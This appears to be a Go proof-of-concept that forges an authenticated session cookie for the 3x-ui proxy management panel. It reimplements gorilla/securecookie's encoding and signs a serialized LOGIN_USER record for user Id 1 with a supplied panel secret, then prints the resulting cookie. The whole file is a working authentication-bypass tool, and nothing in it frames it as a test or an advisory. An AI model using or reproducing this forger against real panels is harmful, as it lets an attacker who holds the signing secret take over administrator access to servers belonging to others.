package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/gob"
	"encoding/hex"
	"fmt"
	"os"
	"time"

	"github.com/mhsanaei/3x-ui/v2/database/model"
)

// forgeSession reproduces gorilla/securecookie's Encode() exactly:
//
//	b = base64url(serialized)
//	b = "name|timestamp|" + b + "|"
//	mac = HMAC-SHA256(key, b[:len(b)-1])       // over "name|timestamp|value"
//	b = (b + mac)[len(name)+1:]                // -> "timestamp|value|mac"
//	cookie = base64url(b)
func forgeSession(name string, secret []byte, values map[interface{}]interface{}) (string, string, error) {
	var buf bytes.Buffer
	if err := gob.NewEncoder(&buf).Encode(values); err != nil {
		return "", "", err
	}
	gobBytes := buf.Bytes()

	value := base64.URLEncoding.EncodeToString(gobBytes)
	ts := time.Now().UTC().Unix()

	signed := fmt.Sprintf("%s|%d|%s", name, ts, value)
	mac := hmac.New(sha256.New, secret)
	mac.Write([]byte(signed))
	sig := mac.Sum(nil)

	raw := fmt.Sprintf("%d|%s|", ts, value)
	raw += string(sig)

	cookie := base64.URLEncoding.EncodeToString([]byte(raw))
	return cookie, hex.EncodeToString(gobBytes[:min(32, len(gobBytes))]), nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func main() {
	gob.Register(model.User{})

	secret := os.Getenv("PANEL_SECRET")
	username := os.Getenv("PANEL_USER")
	hash := os.Getenv("PANEL_HASH")
	if secret == "" {
		fmt.Fprintln(os.Stderr, "PANEL_SECRET required")
		os.Exit(1)
	}

	values := map[interface{}]interface{}{
		"LOGIN_USER": model.User{Id: 1, Username: username, Password: hash},
	}

	cookie, gobHex, err := forgeSession("3x-ui", []byte(secret), values)
	if err != nil {
		fmt.Fprintln(os.Stderr, "err:", err)
		os.Exit(1)
	}

	fmt.Println("gob_hex_prefix:", gobHex)
	fmt.Println("cookie_len:", len(cookie))
	fmt.Println("COOKIE:", cookie)
}
